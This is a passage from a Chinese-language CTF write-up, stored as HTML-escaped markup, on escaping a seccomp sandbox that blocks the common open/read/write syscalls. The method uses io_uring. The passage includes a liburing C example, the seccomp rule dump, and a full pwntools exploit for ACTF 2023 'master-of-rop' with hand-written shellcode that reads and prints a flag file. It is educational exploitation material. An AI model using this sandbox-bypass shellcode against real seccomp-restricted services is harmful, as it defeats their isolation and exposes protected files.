[rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 18 &#x9;/*opcode*/&#xA;    mov byte ptr [rdi&amp;#43;1], 0&#x9;/* IOSQE_ flags*/&#xA;    mov dword ptr [rdi&amp;#43;4], -100&#x9;/* file descriptor to do IO on */&#xA;    /* 要打开文件的路径存放在 rsp&amp;#43;0x300 处 */&#xA;    mov rax, 0x67616c662f2e&#xA;    mov qword ptr [rsp&amp;#43;0x300], rax&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax /*pathname*/&#xA;    mov dword ptr [rdi&amp;#43;28], 0&#x9;/*open_flag*/&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 1&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x210]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x164]&#xA;    add rdi, rdx&#xA;    mov edx, dword ptr [rdi&amp;#43;8]&#xA;    mov qword ptr [rsp&amp;#43;0x220], rdx&#xA;&#xA; /*read*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 22&#xA;    mov rax, qword ptr [rsp&amp;#43;0x220]&#xA;    mov dword ptr [rdi&amp;#43;4], eax&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax&#xA;    mov dword ptr [rdi&amp;#43;24], 0x100&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 1&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&#xA;/*write*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 23&#xA;    mov dword ptr [rdi&amp;#43;4], 1&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax&#xA;    mov dword ptr [rdi&amp;#43;24], 0x100&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&amp;#34;&amp;#34;&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;mmap映射&lt;/strong&gt;：&lt;/p&gt;&#xA;&lt;p&gt;在初始化&lt;code&gt;io_uring&lt;/code&gt;的时候，分别对&lt;code&gt;SQ&lt;/code&gt;、&lt;code&gt;CQ&lt;/code&gt;、&lt;code&gt;SQEs&lt;/code&gt;进行了三次mmap映射，&lt;code&gt;offset&lt;/code&gt;参数需要分别设置为&lt;code&gt;IORING_OFF_SQ_RING&lt;/code&gt;、&lt;code&gt;IORING_OFF_CQ_RING&lt;/code&gt;、&lt;code&gt;IORING_OFF_SQES&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#define IORING_OFF_SQ_RING 0ULL&#xA;#define IORING_OFF_CQ_RING 0x8000000ULL&#xA;#define IORING_OFF_SQES 0x10000000ULL&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;liburing&#34;&gt;&lt;span&gt;liburing&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#liburing&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;实现了对底层系统调用的封装&lt;/p&gt;&#xA;&lt;p&gt;初始化与清理&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct io_uring ring;&#xA;// 初始化 (默认128条目)&#xA;int io_uring_queue_init(unsigned entries, struct io_uring *ring, unsigned flags);&#xA;// 清理资源&#xA;void io_uring_queue_exit(struct io_uring *ring);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提交队列管理&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// 获取下一个可用的 SQE&#xA;struct io_uring_sqe *io_uring_get_sqe(struct io_uring *ring);&#xA;// 批量提交 SQE&#xA;int io_uring_submit(struct io_uring *ring);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;操作准备函数&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// 准备读操作&#xA;void io_uring_prep_read(struct io_uring_sqe *sqe, int fd, void *buf, unsigned nbytes, off_t offset);&#xA;// 准备写操作&#xA;void io_uring_prep_write(struct io_uring_sqe *sqe, int fd, const void *buf, unsigned nbytes, off_t offset);&#xA;// 准备打开操作&#xA;void io_uring_prep_openat(struct io_uring_sqe *sqe, int dfd, const char *path, int flags, mode_t mode);&#xA;// 准备关闭操作&#xA;void io_uring_prep_close(struct io_uring_sqe *sqe, int fd);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完成处理&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// 等待完成事件&#xA;int io_uring_wait_cqe(struct io_uring *ring, struct io_uring_cqe **cqe);&#xA;// 查看完成事件(非阻塞)&#xA;int io_uring_peek_cqe(struct io_uring *ring, struct io_uring_cqe **cqe);&#xA;// 标记事件已处理&#xA;void io_uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;进行orw&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// gcc -o shellcode shellcode.c -luring -lseccomp -static&#xA;#include &amp;lt;stdio.h&amp;gt;&#xA;#include &amp;lt;fcntl.h&amp;gt;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xA;#include &amp;lt;liburing.h&amp;gt;&#xA;#include &amp;lt;seccomp.h&amp;gt;&#xA;#include &amp;lt;syscall.h&amp;gt;&#xA;&#xA;#define BUFFER_SIZE 4096&#xA;&#xA;int main() {&#xA;    struct io_uring ring;&#xA;    struct io_uring_cqe *cqe;&#xA;    struct io_uring_sqe *sqe;&#xA;    char buffer[BUFFER_SIZE] = {0};&#xA;    int fd;&#xA;    &#xA;    io_uring_queue_init(16, &amp;amp;ring, 0);&#xA;    sqe = io_uring_get_sqe(&amp;amp;ring);&#xA;    io_uring_prep_openat(sqe, AT_FDCWD, &amp;#34;flag&amp;#34;, O_RDONLY, 0);&#xA;    io_uring_submit(&amp;amp;ring);&#xA;    io_uring_wait_cqe(&amp;amp;ring, &amp;amp;cqe);&#xA;    fd = cqe-&amp;gt;res;&#xA;&#xA;    sqe = io_uring_get_sqe(&amp;amp;ring);&#xA;    io_uring_prep_read(sqe, fd, buffer, BUFFER_SIZE, 0);&#xA;    io_uring_submit(&amp;amp;ring);&#xA;    io_uring_wait_cqe(&amp;amp;ring, &amp;amp;cqe);&#xA;    &#xA;    sqe = io_uring_get_sqe(&amp;amp;ring);&#xA;    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFFER_SIZE, 0);&#xA;    io_uring_submit(&amp;amp;ring);&#xA;&#xA;    io_uring_queue_exit(&amp;amp;ring);&#xA;&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;actf-2023-master-of-rop&#34;&gt;&lt;span&gt;ACTF 2023 master-of-rop&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#actf-2023-master-of-rop&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;沙箱禁掉了常用的orw及其替代syscall，需要寻找一些其他的替代syscall&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt; line  CODE  JT   JF      K&#xA;=================================&#xA; 0000: 0x20 0x00 0x00 0x00000004  A = arch&#xA; 0001: 0x15 0x00 0x19 0xc000003e  if (A != ARCH_X86_64) goto 0027&#xA; 0002: 0x20 0x00 0x00 0x00000000  A = sys_number&#xA; 0003: 0x35 0x00 0x01 0x40000000  if (A &amp;lt; 0x40000000) goto 0005&#xA; 0004: 0x15 0x00 0x16 0xffffffff  if (A != 0xffffffff) goto 0027&#xA; 0005: 0x15 0x15 0x00 0x00000000  if (A == read) goto 0027&#xA; 0006: 0x15 0x14 0x00 0x00000001  if (A == write) goto 0027&#xA; 0007: 0x15 0x13 0x00 0x00000002  if (A == open) goto 0027&#xA; 0008: 0x15 0x12 0x00 0x00000011  if (A == pread64) goto 0027&#xA; 0009: 0x15 0x11 0x00 0x00000012  if (A == pwrite64) goto 0027&#xA; 0010: 0x15 0x10 0x00 0x00000013  if (A == readv) goto 0027&#xA; 0011: 0x15 0x0f 0x00 0x00000014  if (A == writev) goto 0027&#xA; 0012: 0x15 0x0e 0x00 0x00000028  if (A == sendfile) goto 0027&#xA; 0013: 0x15 0x0d 0x00 0x0000002c  if (A == sendto) goto 0027&#xA; 0014: 0x15 0x0c 0x00 0x0000002e  if (A == sendmsg) goto 0027&#xA; 0015: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0027&#xA; 0016: 0x15 0x0a 0x00 0x00000101  if (A == openat) goto 0027&#xA; 0017: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0027&#xA; 0018: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0027&#xA; 0019: 0x15 0x07 0x00 0x0000012f  if (A == name_to_handle_at) goto 0027&#xA; 0020: 0x15 0x06 0x00 0x00000130  if (A == open_by_handle_at) goto 0027&#xA; 0021: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0027&#xA; 0022: 0x15 0x04 0x00 0x00000147  if (A == preadv2) goto 0027&#xA; 0023: 0x15 0x03 0x00 0x00000148  if (A == pwritev2) goto 0027&#xA; 0024: 0x15 0x02 0x00 0x000001ac  if (A == 0x1ac) goto 0027&#xA; 0025: 0x15 0x01 0x00 0x000001b5  if (A == 0x1b5) goto 0027&#xA; 0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW&#xA; 0027: 0x06 0x00 0x00 0x00000000  return KILL&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;确定内核版本&#34;&gt;&lt;span&gt;确定内核版本&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%a1%ae%e5%ae%9a%e5%86%85%e6%a0%b8%e7%89%88%e6%9c%ac&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;首先需要确定内核版本&lt;/p&gt;&#xA;&lt;p&gt;确定内核版本的方法：&lt;/p&gt;&#xA;&lt;p&gt;以我本地为例，我的内核版本&lt;code&gt; 6.6.87&lt;/code&gt;，但是我去调用一些新内核版本才有的系统调用：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;shellcode = asm(&amp;#39;&amp;#39;&amp;#39;&#xA;    mov rax, 454&#xA;    xor rdi, rdi&#xA;    xor rsi, rsi&#xA;    xor rdx, rdx&#xA;    syscall&#xA;    &#xA;    &amp;#39;&amp;#39;&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个syscall的返回值存在RAX是：&lt;code&gt;0xffffffffffffffda&lt;/code&gt;，在 64 位有符号数下就是 &lt;code&gt;-38&lt;/code&gt;。表示 &lt;strong&gt;&lt;code&gt;syscall&lt;/code&gt; 返回了 -ENOSYS，说明该系统调用在你这个内核版本中不存在&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;p&gt;远程的话不会回显，可以通过 &lt;code&gt;cmp rax, -38&lt;/code&gt;判断，如果ENOSYS就wirte一些信息&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;寻找代替系统调用&#34;&gt;&lt;span&gt;寻找代替系统调用&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%af%bb%e6%89%be%e4%bb%a3%e6%9b%bf%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;由于禁掉了常用的一些orw系统调用，需要去寻找其他替代的系统调用来orw&lt;/p&gt;&#xA;&lt;p&gt;别人测得的版本小于 &lt;code&gt;6.1.60&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;以 &lt;code&gt;linux-5.15.137&lt;/code&gt; 为参考&lt;/p&gt;&#xA;&lt;p&gt;深入&lt;code&gt;SYS_openat&lt;/code&gt;后发现，其主要逻辑是调用&lt;code&gt;do_filp_open&lt;/code&gt;，而&lt;code&gt;do_file_open&lt;/code&gt;又会被&lt;code&gt;io_uring.c&lt;/code&gt;这个文件调用。&lt;/p&gt;&#xA;&lt;p&gt;了解&lt;code&gt;io_uring&lt;/code&gt;之后发现其能够替代orw，至此，确定了通过&lt;code&gt;io_uring&lt;/code&gt;实现orw&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;实现&#34;&gt;&lt;span&gt;实现&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%ae%9e%e7%8e%b0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;liburing&lt;/code&gt;提供了对底层系统调用的封装，但是看了看，还是觉得直接用系统调用写shellcode比较简单，这里直接用模板&lt;/p&gt;&#xA;&lt;p&gt;exp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # pause()&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;p = process(address)&#xA;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;# ip = &amp;#34;&amp;#34;&#xA;# port = &#xA;#p = remote(ip,port)&#xA;&#xA;shellcode = asm(&amp;#34;&amp;#34;&amp;#34;&#xA;/*视情况调整栈帧*/&#xA;    add rsp, 0x2000&#xA;/*int uring_fd = syscall(SYS_io_uring_setup, 16, &amp;amp;params);*/&#xA;    mov rax, 0&#xA;    lea rdi, [rsp&amp;#43;0x100]&#xA;    mov rcx, 15&#xA;    rep stosq&#xA;    mov rdi, 16&#xA;    lea rsi, [rsp&amp;#43;0x100]&#xA;    mov rax, 0x1a9&#xA;    syscall&#xA;/*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/&#xA;    mov qword ptr [rsp&amp;#43;0x200], rax&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x208], rax&#xA;/*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0x8000000&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x210], rax&#xA;/*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0x10000000&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x218], rax&#xA;&#xA;/*openat*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 18 &#x9;/*opcode*/&#xA;    mov byte ptr [rdi&amp;#43;1], 0&#x9;/* IOSQE_ flags*/&#xA;    mov dword ptr [rdi&amp;#43;4], -100&#x9;/* file descriptor to do IO on */&#xA;    /* 要打开文件的路径存放在 rsp&amp;#43;0x300 处 */&#xA;    mov rax, 0x67616c662f2e&#xA;    mov qword ptr [rsp&amp;#43;0x300], rax&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax /*pathname*/&#xA;    mov dword ptr [rdi&amp;#43;28], 0&#x9;/*open_flag*/&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 1&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x210]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x164]&#xA;    add rdi, rdx&#xA;    mov edx, dword ptr [rdi&amp;#43;8]&#xA;    mov qword ptr [rsp&amp;#43;0x220], rdx&#xA;&#xA; /*read*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 22&#xA;    mov rax, qword ptr [rsp&amp;#43;0x220]&#xA;    mov dword ptr [rdi&amp;#43;4], eax&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax&#xA;    mov dword ptr [rdi&amp;#43;24], 0x100&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 1&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&#xA;/*write*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 23&#xA;    mov dword ptr [rdi&amp;#43;4], 1&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax&#xA;    mov dword ptr [rdi&amp;#43;24], 0x100&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&amp;#34;&amp;#34;&amp;#34;)&#xA;&#xA;p.recvuntil(b&amp;#39;code\n&amp;#39;)&#xA;# dbg()&#xA;p.send(shellcode)&#xA;&#xA;&#xA;p.interactive()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可能要多打几次才能打通&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;参考文章&#34;&gt;&lt;span&gt;参考文章&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/xiaocangxu/pwn/pd2zc37ebgbanvau#vqGHAs&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.yuque.com/xiaocangxu/pwn/pd2zc37ebgbanvau#vqGHAs&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a 